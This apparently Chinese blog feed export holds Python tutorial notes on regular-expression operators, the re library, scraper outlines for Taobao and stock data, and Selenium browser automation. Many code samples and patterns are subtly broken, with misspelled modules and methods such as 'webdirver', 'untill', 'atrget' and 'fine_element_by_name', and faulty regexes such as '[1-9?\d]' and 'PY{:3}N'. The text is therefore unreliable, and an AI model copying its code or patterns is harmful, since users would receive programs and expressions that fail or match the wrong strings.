title="正则表达式常用操作符"></a>正则表达式常用操作符</h3><table><thead><tr><th>操作符</th><th>说明</th><th>实例</th></tr></thead><tbody><tr><td>.</td><td>表示任何单个字符</td><td></td></tr><tr><td>[]</td><td>字符集，对单个字符给出取值范围</td><td>[abc]表示a、b、c，[a-z]表示a到z单个字符</td></tr><tr><td>[^ ]</td><td>非字符集，对单个字符给出排除范围</td><td>[^abc]表示非a或b或c的单个字符</td></tr><tr><td>*</td><td>前一个字符0次或无限次扩展</td><td>abc*表示ab、abc、abcc、abccc等</td></tr><tr><td>+</td><td>前一个字符1次或无限次扩展</td><td>abc+表示abc、abcc、abccc等</td></tr><tr><td>?</td><td>前一个字符0次货1次扩展</td><td>abc？表示ab、abc</td></tr><tr><td>|</td><td>左右表达式任意一个</td><td>abc|def表示abc、def</td></tr><tr><td>{m}</td><td>扩展前一个字符m次</td><td>ab{2}c表示abbc</td></tr><tr><td>{m,n}</td><td>扩展前一个字符m至n次（含n）</td><td>ab{1,2}c表示abc，abbc</td></tr><tr><td>^</td><td>匹配字符串开头</td><td>^abc表示abc且在一个字符串的开头</td></tr><tr><td>$</td><td>匹配字符串结尾</td><td>abc$表示abc且在一个字符串的结尾</td></tr><tr><td>()</td><td>分组标记，内部只能使用 | 操作符</td><td>(abc)表示abc，(abc|def)表示abc、def</td></tr><tr><td>\d</td><td>数字，等价于[0-9]</td><td></td></tr><tr><td>\w</td><td>单词字符，等价于[A-Za-z0-9_]</td><td></td></tr></tbody></table><h3 id="正则表达式语法实例"><a href="#正则表达式语法实例" class="headerlink" title="正则表达式语法实例"></a>正则表达式语法实例</h3><table><thead><tr><th>正则表达式</th><th>对应的字符串</th></tr></thead><tbody><tr><td>P(Y|YT|YTH|YTHO)?N</td><td>‘PN’、 ‘PYN’ 、 ‘PYTHN’、’PYTHON’</td></tr><tr><td>PYTHON+</td><td>‘PYTHON’、’PYTHONN’、’PYTHONNN’ …等</td></tr><tr><td>PY[TH]ON</td><td>‘PYTON’、’PYHON’</td></tr><tr><td>PY[ ^TH]?ON</td><td>‘PYON’、’PYaON’、’PYbON’、’PYcON’ …等</td></tr><tr><td>PY{:3}N</td><td>‘PN’、’PYN’、’PYYN’、’PYYYN’</td></tr></tbody></table><h3 id="经典的正则表达式实例"><a href="#经典的正则表达式实例" class="headerlink" title="经典的正则表达式实例"></a>经典的正则表达式实例</h3><table><thead><tr><th><strong>正则表达式</strong></th><th>说明</th></tr></thead><tbody><tr><td>^[A-Za-z]+$</td><td>由26个字母组成的字符串</td></tr><tr><td>^[A-Za-z0-9]+$</td><td>由26个字母和数字组成的字符串</td></tr><tr><td>^-?\d+$</td><td>整数形式的字符串</td></tr><tr><td>^[0-9]*[1-9] [0-9] *$</td><td>正整数形式的字符串</td></tr><tr><td>[1-9]\d{5}</td><td>中国境内邮政编码，6位</td></tr><tr><td>[\u4e00-\u9fa5]</td><td>匹配中文字符</td></tr><tr><td>\d{3}-\d{8}|\d{4}-\d{7}</td><td>国内电话号码，010-68913536</td></tr></tbody></table><h4 id="匹配IP地址的正则表达式"><a href="#匹配IP地址的正则表达式" class="headerlink" title="匹配IP地址的正则表达式"></a>匹配IP地址的正则表达式</h4><p>ip地址字符串形式的正则表达式（ip地址分4段，每段0-255）</p><ul><li><p>\d+.\d+.\d+.\d+</p></li><li><p>\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}</p></li></ul><p>精确写法</p><p>0-99：[1-9?\d]    </p><p>100-199：1\d{2}</p><p>200-249：2[0-4]\d</p><p>250-255：25[0-5]</p><p><strong>(([1-9?\d]|1\d{2}|2[0-4]\d|25[0-5]).){3}([1-9?\d]|1\d{2}|2[0-4]\d|25[0-5])</strong></p><h1 id="Re库"><a href="#Re库" class="headerlink" title="Re库"></a>Re库</h1><p>Re库是Python的标准库，主要用于字符串匹配。</p><p><strong>调用方法：import re</strong></p><h2 id="正则表达式的表示类型"><a href="#正则表达式的表示类型" class="headerlink" title="正则表达式的表示类型"></a>正则表达式的表示类型</h2><h3 id="raw-string类型（原生字符串类型）"><a href="#raw-string类型（原生字符串类型）" class="headerlink" title="raw string类型（原生字符串类型）"></a>raw string类型（原生字符串类型）</h3><p><strong>re库采用raw string类型表示正则表达式，表示为：r’tetx’</strong></p><p>例如：r ‘[1-9]\d{5}’</p><p>​            ‘\d{3}-\d{8}|\d{4}-\d{7}’</p><p><strong>raw string类型不包含转义符</strong></p><h3 id="string类型，更繁琐"><a href="#string类型，更繁琐" class="headerlink" title="string类型，更繁琐"></a>string类型，更繁琐</h3><p>例如：r ‘[1-9] \\d{5}’</p><p>​            ‘\\d{3}-\\d{8}|\\d{4}-\\d{7}’</p><h2 id="Re库主要功能函数"><a href="#Re库主要功能函数" class="headerlink" title="Re库主要功能函数"></a>Re库主要功能函数</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>re.search()</td><td>在一个字符串中<strong>搜素匹配正则表达式的第一个位置</strong>，返回match对象</td></tr><tr><td>re.match()</td><td>从一个字符串的<strong>开始位置起匹配正则表达式</strong>，返回match对象</td></tr><tr><td>re.findall()</td><td>搜索字符串，<strong>从列表类型返回全部能匹配的子串</strong></td></tr><tr><td>re.split()</td><td>将一个字符串<strong>按照正则表达式匹配结果进行分割，返回列表类型</strong></td></tr><tr><td>re.finditer()</td><td>搜索字符串，返回一个匹配结果的<strong>迭代类型</strong>，每个迭代元素是match对象</td></tr><tr><td>re.sub()</td><td>在一个字符串中<strong>替代所有匹配正则表达式的子串，返回替换后的字符串</strong></td></tr></tbody></table><h3 id="re-search-pattern-string-flags-0"><a href="#re-search-pattern-string-flags-0" class="headerlink" title="re.search(pattern, string, flags=0)"></a>re.search(pattern, string, flags=0)</h3><h3 id="re-match-pattern-string-flags-0"><a href="#re-match-pattern-string-flags-0" class="headerlink" title="re.match(pattern, string, flags=0)"></a>re.match(pattern, string, flags=0)</h3><h3 id="re-findall-pattern-string-flags-0"><a href="#re-findall-pattern-string-flags-0" class="headerlink" title="re.findall(pattern, string, flags=0)"></a>re.findall(pattern, string, flags=0)</h3><h3 id="re-split-pattern-string-maxsplit-0-flags-0）"><a href="#re-split-pattern-string-maxsplit-0-flags-0）" class="headerlink" title="re.split(pattern, string, maxsplit=0, flags=0）"></a>re.split(pattern, string, maxsplit=0, flags=0）</h3><h3 id="re-finditer-pattern-string-flags-0"><a href="#re-finditer-pattern-string-flags-0" class="headerlink" title="re.finditer(pattern, string, flags=0)"></a>re.finditer(pattern, string, flags=0)</h3><h3 id="re-sub-pattern-repl-string-count-0-flags-0"><a href="#re-sub-pattern-repl-string-count-0-flags-0" class="headerlink" title="re.sub(pattern, repl, string, count=0, flags=0)"></a>re.sub(pattern, repl, string, count=0, flags=0)</h3><p>pattern：正则表达式的字符串或原生字符串表示 </p><p>repl：替换匹配字符串的字符串</p><p>string：待匹配字符串</p><p>count：匹配的最大替换次数</p><p>maxsplit：最大分割数，剩余部分作为最后一个元素输出</p><p>flags：正则表达式使用时的控制标记</p><table><thead><tr><th>常用标志</th><th>说明</th></tr></thead><tbody><tr><td>re.I  re.IGNORECASE</td><td>忽略正则表达式的大小写，[A-Z]能匹配到小写字符</td></tr><tr><td>re.M   re.MULTILINE</td><td>正则表达式中的^操作符能够将给定字符串的每行当做匹配开始</td></tr><tr><td>re.S   re.DOTALL</td><td>正则表达式中的 . 操作符能够匹配所有字符，默认匹配除换行外所有字符</td></tr></tbody></table><h3 id="regex-re-compile-pattern-flags-0"><a href="#regex-re-compile-pattern-flags-0" class="headerlink" title="regex = re.compile(pattern, flags=0)"></a>regex = re.compile(pattern, flags=0)</h3><p>将正则表达式的字符串形式编译成正则表达式对象</p><h2 id="Re库的match对象"><a href="#Re库的match对象" class="headerlink" title="Re库的match对象"></a>Re库的match对象</h2><p><strong>Match对象的属性</strong></p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.string</td><td>待匹配的文本</td></tr><tr><td>.re</td><td>匹配时使用的pattern对象（正则表达式）</td></tr><tr><td>.pos</td><td>正则表达式搜索文本的开始位置</td></tr><tr><td>.endpos</td><td>正则表达式搜索文本的结束位置</td></tr></tbody></table><p><strong>Match对象的方法</strong> </p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>.group(0)</td><td>获得匹配后的字符串</td></tr><tr><td>.start()</td><td>匹配字符串在原始字符串的开始位置</td></tr><tr><td>.end()</td><td>匹配字符串在原始字符串的结束位置</td></tr><tr><td>.span()</td><td>返回（.start(),.end()）</td></tr></tbody></table><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580978553749.png"  alt="1580978553749"></p><h2 id="Re库的贪婪匹配和最小匹配"><a href="#Re库的贪婪匹配和最小匹配" class="headerlink" title="Re库的贪婪匹配和最小匹配"></a>Re库的贪婪匹配和最小匹配</h2><h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><p>Re库默认采用贪婪匹配，即输出匹配最长的子串。</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580979000373.png"  alt="1580979000373"></p><h3 id="最小匹配"><a href="#最小匹配" class="headerlink" title="最小匹配"></a>最小匹配</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580979138434.png"  alt="1580979138434"></p><p><strong>最小匹配操作符</strong></p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>*?</td><td>前一个字符0次或无限次扩展，最小匹配</td></tr><tr><td>+?</td><td>前一个字符1次或无限次扩展，最小匹配</td></tr><tr><td>??</td><td>前一个字符0次或1次扩展，最小匹配</td></tr><tr><td>{m,n}?</td><td>扩展前一个字符m至n次（含n），最小匹配</td></tr></tbody></table><h2 id="实例：淘宝商品信息定向爬虫"><a href="#实例：淘宝商品信息定向爬虫" class="headerlink" title="实例：淘宝商品信息定向爬虫"></a>实例：淘宝商品信息定向爬虫</h2><h3 id="程序的结构设计"><a href="#程序的结构设计" class="headerlink" title="程序的结构设计"></a>程序的结构设计</h3><p>步骤1：提交商品搜索请求，循环获取页面</p><p>步骤2：对于每个页面，提取商品名称和价格信息</p><p>步骤3：将信息输出到屏幕上</p><h2 id="实例：股票数据定向爬虫"><a href="#实例：股票数据定向爬虫" class="headerlink" title="实例：股票数据定向爬虫"></a>实例：股票数据定向爬虫</h2><p>目标：获取上交所和深交所所有股票的名称和交易信息</p><p>输出：保存到文件中</p><p>技术路线：requests—bs4—re</p><p><strong>候选数据网站</strong></p><p>新浪股票：<a href="http://finance.sina.com.cn/stock/" target="_blank" rel="noopener">http://finance.sina.com.cn/stock/</a></p><p>百度股票：<a href="http://gupiao.baidu.com/stock" target="_blank" rel="noopener">http://gupiao.baidu.com/stock</a></p><p><strong>候选数据网站的选取原则</strong></p><p>选取原则：股票信息静态存在于HTML页面中，非js代码生成，没有Robots协议限制</p><p>选取方法：游览器F12，源代码查看等</p><p><strong>程序设计结构</strong></p><p>步骤1：获取股票列表</p><p>步骤2：根据股票列表逐个到百度股票回去个股信息</p><p>步骤3：将结果存储到文件</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之Selenium库</title>
      <link href="/2020/04/27/Selenium%E5%BA%93/"/>
      <url>/2020/04/27/Selenium%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Selenium库"><a href="#Selenium库" class="headerlink" title="Selenium库"></a>Selenium库</h1><p>自动化测试工具，支持多种游览器</p><p>爬虫中主要用来解决JavaScript渲染的问题</p><h2 id="安装Selenium"><a href="#安装Selenium" class="headerlink" title="安装Selenium"></a>安装Selenium</h2><p>pip3 install selenium</p><p>安装游览器驱动</p><p>下载驱动地址：<a href="https://github.com/mozilla/geckodriver/releases/" target="_blank" rel="noopener">https://github.com/mozilla/geckodriver/releases/</a></p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver<span class="comment">#游览器驱动对象 </span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDirverWait</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()<span class="comment">#申明游览器对象</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.get(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">    input = browser.find_element_by_id(<span class="string">'kw'</span>)<span class="comment">#查找id为kw的元素</span></span><br><span class="line">    input.send_keys(<span class="string">'Python'</span>)<span class="comment">#向元素发送键，敲入Python</span></span><br><span class="line">    input.send_keys(Keys.ENTER)<span class="comment">#敲入回车</span></span><br><span class="line">    wait = WebDriverWait(browser,<span class="number">10</span>)<span class="comment">#调用等待</span></span><br><span class="line">    wait.untill(EC.presence_of_element_located((By.ID,<span class="string">'content_left'</span>)))<span class="comment">#等待ID为content_left元素加载</span></span><br><span class="line">    print(browser.current_url)<span class="comment">#打印当前的url</span></span><br><span class="line">    print(browser.get_cookies())<span class="comment">#打印当前cookie</span></span><br><span class="line">    print(browser.page_source)<span class="comment">#page_source，打印网页源代码</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.close()<span class="comment">#关掉游览器</span></span><br></pre></td></tr></table></figure><h3 id="声明游览器对象"><a href="#声明游览器对象" class="headerlink" title="声明游览器对象"></a>声明游览器对象</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdirver<span class="comment">#游览器驱动对象 </span></span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser = webdriver.Firefox()<span class="comment">#申明游览器对象</span></span><br><span class="line">browser = webdriver.Edge()</span><br><span class="line">browser = webdriver.PhantomJS()</span><br><span class="line">browser = webdriver.Safari()</span><br></pre></td></tr></table></figure><h3 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdirver<span class="comment">#游览器驱动对象 </span></span><br><span class="line"></span><br><span class="line">browser = webdirver.Firefox()<span class="comment">#申明游览器对象</span></span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line">print(browser.page_source)<span class="comment">##page_source，打印网页源代码</span></span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><h3 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h3><h4 id="单个元素"><a href="#单个元素" class="headerlink" title="单个元素"></a>单个元素</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdirver<span class="comment">#游览器驱动对象 </span></span><br><span class="line"></span><br><span class="line">browser = webdirver.Firefox()<span class="comment">#申明游览器对象</span></span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#三种方法查找</span></span><br><span class="line">input_first = browser.find_element_by_id(<span class="string">'q'</span>)<span class="comment">#查找id为q的元素</span></span><br><span class="line">input_second = browser.find_element_by_css_selector(<span class="string">'#q'</span>)<span class="comment">#使用css选择器查找</span></span><br><span class="line">input_third = browser.find_element_by_xpath(<span class="string">'//*[@id="q"]'</span>)<span class="comment">#使用xpath选择器查找</span></span><br><span class="line"></span><br><span class="line">print(input_first,input_second,input_third)</span><br><span class="line">browser.close</span><br></pre></td></tr></table></figure><h5 id="其他查找方法"><a href="#其他查找方法" class="headerlink" title="其他查找方法"></a>其他查找方法</h5><ul><li>fine_element_by_name</li><li>fine_element_by_xpath</li><li>fine_element_by_link_text</li><li>fine_element_by_partial_link_text</li><li>fine_element_by_tag_name</li><li>fine_element_by_class_name</li><li>fine_element_by_css_selector</li></ul><h5 id="通用查找方法"><a href="#通用查找方法" class="headerlink" title="通用查找方法"></a>通用查找方法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line">input_first = browser.find_element(By.ID,<span class="string">'q'</span>)</span><br><span class="line">print(input_first)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><h4 id="多个元素"><a href="#多个元素" class="headerlink" title="多个元素"></a>多个元素</h4><p>与单个元素的区别是<strong>单元数是element</strong>，<strong>多元素是elements</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line">lis = browser.find_elements_by_css_selector(<span class="string">'.service-bd li'</span>)</span><br><span class="line">print(lis)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line">lis = browser.find_elements(By.CSS_SELECTOR,<span class="string">'.service-bd li'</span>)</span><br><span class="line">print(lis)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><h5 id="其他查找方法-1"><a href="#其他查找方法-1" class="headerlink" title="其他查找方法"></a>其他查找方法</h5><ul><li>fine_elements_by_name</li><li>fine_elements_by_xpath</li><li>fine_elements_by_link_text</li><li>fine_elements_by_partial_link_text</li><li>fine_elements_by_tag_name</li><li>fine_elements_by_class_name</li><li>fine_elements_by_css_selector</li></ul><h3 id="元素交互操作"><a href="#元素交互操作" class="headerlink" title="元素交互操作"></a>元素交互操作</h3><p>对获取的元素调用交互方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://taobao.com'</span>)</span><br><span class="line">input = browser.find_element_by_id(<span class="string">'q'</span>)<span class="comment">#查找id为q的元素，实际是输入框</span></span><br><span class="line">input.send_keys(<span class="string">'iPhone'</span>)<span class="comment">#输入键为iPhone</span></span><br><span class="line">time.sleep(<span class="number">1</span>)<span class="comment">#等待一秒</span></span><br><span class="line">input.clear()<span class="comment">#清空文本框</span></span><br><span class="line">input.send_keys(<span class="string">'iPad'</span>)<span class="comment">#输入键为iPad</span></span><br><span class="line">button = browser.find_element_by_classs_name(<span class="string">'btn-search'</span>)<span class="comment">#查找name为btn-search的元素</span></span><br><span class="line">button.click()<span class="comment">#跳转请求为搜索结果</span></span><br></pre></td></tr></table></figure><h3 id="交互动作"><a href="#交互动作" class="headerlink" title="交互动作"></a>交互动作</h3><p>将动作附加到动作链中串行执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'http://www.runoob.com/try/try.php?filename=jqueryui-apl-droppable'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)<span class="comment">#切换到iframeResult元素里面</span></span><br><span class="line">source = browser.find_element_by_css_selector(<span class="string">'#draggable'</span>)<span class="comment">#查找draggable拖拽元素</span></span><br><span class="line">target = browser.find_element_by_css_selector(<span class="string">'#droppable'</span>)<span class="comment">#查找droppable被拖拽元素</span></span><br><span class="line">actions = ActionChains(browser)<span class="comment">#申明动作对象</span></span><br><span class="line">actions.drag_and_drop(source,atrget)<span class="comment">#进行拖拽</span></span><br><span class="line">actions.perform()<span class="comment">#执行拖拽动作</span></span><br></pre></td></tr></table></figure><h3 id="执行JavaScript"><a href="#执行JavaScript" class="headerlink" title="执行JavaScript"></a>执行JavaScript</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'window.scrollTo(0,document.body.scrollHeight)'</span>)<span class="comment">#下拉到网页最下端</span></span><br><span class="line">browser.execute_script(<span class="string">'alert("To Bottom")'</span>)<span class="comment">#提示信息To Bottom</span></span><br></pre></td></tr></table></figure><h3 id="获取元素信息"><a href="#获取元素信息" class="headerlink" title="获取元素信息"></a>获取元素信息</h3><h4 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">logo = browser.find_element_by_id(<span class="string">'zh-top-link-logo'</span>)</span><br><span class="line">print(logo)</span><br><span class="line">print(logo.get_attribute(<span class="string">'class'</span>))</span><br></pre></td></tr></table></figure><h4 id="获取文本值"><a href="#获取文本值" class="headerlink" title="获取文本值"></a>获取文本值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">input = browser.find_element_by_class_name(<span class="string">'zh-top-link-logo'</span>)</span><br><span class="line">print(input.text)</span><br></pre></td></tr></table></figure><h4 id="获取ID、位置、标签名、大小"><a href="#获取ID、位置、标签名、大小" class="headerlink" title="获取ID、位置、标签名、大小"></a>获取ID、位置、标签名、大小</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">input = browser.find_element_by_class_name(<span class="string">'zh-top-add-question'</span>)</span><br><span class="line">print(input.id)</span><br><span class="line">print(input.location)</span><br><span class="line">print(input.tag_name)</span><br><span class="line">print(input.size)</span><br></pre></td></tr></table></figure><h4 id="Frame"><a href="#Frame" class="headerlink" title="Frame"></a>Frame</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> NoSuchElementException</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">'http://www.runoob.com/try/try.php?filename=jqueryui-apl-droppable'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)<span class="comment">#切换到iframeResult元素里面</span></span><br><span class="line">source = browser.find_element_by_css_selector(<span class="string">'#draggable'</span>)</span><br><span class="line">print(source)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    logo = browser.fine_element_by_class_name(<span class="string">'logo'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">'NO LOGO'</span>)</span><br><span class="line">browser.switch_to.parent_frame()<span class="comment">#切换到其他frame</span></span><br><span class="line">logo = browser.find_element_by_class_naem(<span class="string">'logo'</span>)</span><br><span class="line">print(logo)</span><br><span class="line">print(logo.text)</span><br></pre></td></tr></table></figure><h3 id="等待"><a href="#等待" class="headerlink" title="等待"></a>等待</h3><h4 id="隐式等待"><a href="#隐式等待" class="headerlink" title="隐式等待"></a>隐式等待</h4><p>当使用隐式等待执行测试的时候，如果webDriver没有在DOM中找到元素，将继续等待，超出设定时间后这抛出找不到元素异常。当查找元素或元素并没有立即出现的时候，隐式等待将等待一段时间再查早DOM，默认的时间是0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">url = <span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.get(url)</span><br><span class="line">input = browser.find_element_by_class_name(<span class="string">'zh-top-add-question'</span>)</span><br><span class="line">print(input)</span><br></pre></td></tr></table></figure><h4 id="显示等待"><a href="#显示等待" class="headerlink" title="显示等待"></a>显示等待</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 